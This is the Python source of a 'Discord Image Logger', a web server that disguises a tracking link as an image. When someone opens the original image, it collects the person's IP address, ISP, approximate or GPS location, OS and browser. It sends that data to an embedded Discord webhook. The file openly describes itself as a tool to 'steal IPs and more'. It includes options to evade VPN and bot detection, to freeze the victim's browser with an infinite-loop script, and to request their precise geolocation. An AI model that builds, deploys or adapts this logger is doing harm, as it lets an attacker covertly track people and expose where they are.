# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1350537736909619241/sZfq-Oq_cGQjs9BF_JSNBThf2DZ9r-c1GHJANsyWEY3hy1SCoUqsZOqJkW07ZlBe6Qv5",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
